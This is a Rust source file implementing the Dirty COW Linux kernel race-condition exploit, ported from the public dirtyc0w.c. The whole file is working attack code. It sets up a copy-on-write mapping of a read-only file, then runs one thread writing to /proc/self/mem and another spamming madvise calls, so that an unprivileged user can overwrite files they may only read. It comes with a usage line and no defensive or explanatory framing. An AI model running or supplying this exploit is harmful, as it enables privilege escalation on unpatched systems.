use std::os::unix::io::AsRawFd;
use std::env::args;
use std::process::exit;
use std::fs::{File, OpenOptions};
use std::ptr;
use std::thread;
use std::thread::JoinHandle;
use std::io::{Read, Write, Seek, SeekFrom};

// Reference: https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c

const EXPECTED_NUM_ARGS: usize = 3;
const NUM_ITERATIONS: usize = 100_000_000;

fn print_help(args: Vec<String>) {
    let program_name: String = args.get(0)
        .unwrap_or(&"exploit".to_string())
        .to_owned();

    println!("Usage: ./{} <INFILE> <OUTFILE>", program_name);
}

fn exploit(infile: File, outfile: File) {
    let inmeta = infile.metadata().unwrap();
    let outmeta = outfile.metadata().unwrap();

    if inmeta.len() > outmeta.len() {
        println!("Infile is larger than outfile, only the first {} bytes of the infile will be written to the outfile", outmeta.len());
    } else if outmeta.len() > inmeta.len() {
        println!("Outfile is larger than infile, zero bytes will be appended to the end of the file");
    }

    let mapping: *const libc::c_void = mmap_outfile(outfile);
    println!("Created copy-on-write memory mapping for outfile at address {:?}", mapping);

    let join_one = spawn_thread_to_write_new_data(infile, mapping);
    let join_two = spawn_thread_to_call_madvise(mapping as usize);

    println!("Waiting for threads to finish");
    join_one.join().expect("Failed to join first thread");
    join_two.join().expect("Failed to join second thread");
}

fn spawn_thread_to_write_new_data(mut infile: File, mapping_address: *const libc::c_void) -> JoinHandle<()> {
    println!("Starting thread to write contents of infile to memory");

    let mapping = mapping_address as usize;

    return thread::spawn(move || {
        let inmeta = infile.metadata().unwrap();

        println!("Reading contents of infile to buffer");
        let mut data_buffer: Vec<u8> = Vec::with_capacity(inmeta.len() as usize);
        infile.read_to_end(&mut data_buffer).expect("Failed to read contents of infile");

        println!("Opening '/proc/self/mem' as read/write");
        let mut self_memory_file = OpenOptions::new()
            .read(true)
            .write(true)
            .open("/proc/self/mem")
            .expect("Failed to open '/proc/self/mem'");

        println!("Attempting to write data to start of memory map file many times");
        for _ in 0..NUM_ITERATIONS {
            self_memory_file
                .seek(SeekFrom::Start(mapping as u64))
                .expect("Failed to seek to address of memory map in '/proc/self/mem'");

            self_memory_file
                .write_all(&data_buffer)
                .expect("Failed to write data to memory map");
        }

        println!("Finished writing data to '/proc/self/mem'");
    });
}

fn spawn_thread_to_call_madvise(mapping: usize) -> JoinHandle<()> {
    println!("Starting thread to spam 'madvise' calls");

    return thread::spawn(move || {
        let mapping_address = mapping as *mut libc::c_void;
        for _ in 0..NUM_ITERATIONS {
            unsafe {
                libc::madvise(
                    mapping_address,        // Advice to the kernel is for this memory address
                    100,                    // Lie to kernel the size of data at this address
                    libc::MADV_DONTNEED     // Lie to the kernel that we don't need this memory anymore
                );
            }
        }

        println!("Finished spamming advise calls");
    });
}

fn mmap_outfile(outfile: File) -> *const libc::c_void {
    let outmeta = outfile.metadata().unwrap();

    unsafe {
        return libc::mmap(
            ptr::null_mut(),        // NULL so that the kernel chooses the address for the mapping
            outmeta.len() as usize, // Map the same amount of space as the size of the file in bytes
            libc::PROT_READ,        // Memory protection = read only
            libc::MAP_PRIVATE,      // Create a private copy-on-write mapping
            outfile.as_raw_fd(),    // File descriptor of our target outfile
            0                       // Byte offset into file where the mapping should start from
        );
    }
}

fn main() {
    let args: Vec<String> = args().collect();

    if args.len() != EXPECTED_NUM_ARGS {
        print_help(args);
        exit(-1);
    }

    println!("Starting dirtyc0w exploit...");

    let infilename = &args[1];
    let outfilename = &args[2];

    println!("Preparing to overwrite contents of file '{}' with contents from file '{}'", outfilename, infilename);

    let infile = File::open(infilename).unwrap();
    let outfile = File::open(outfilename).unwrap();

    exploit(infile, outfile);

    println!("Finished");
}

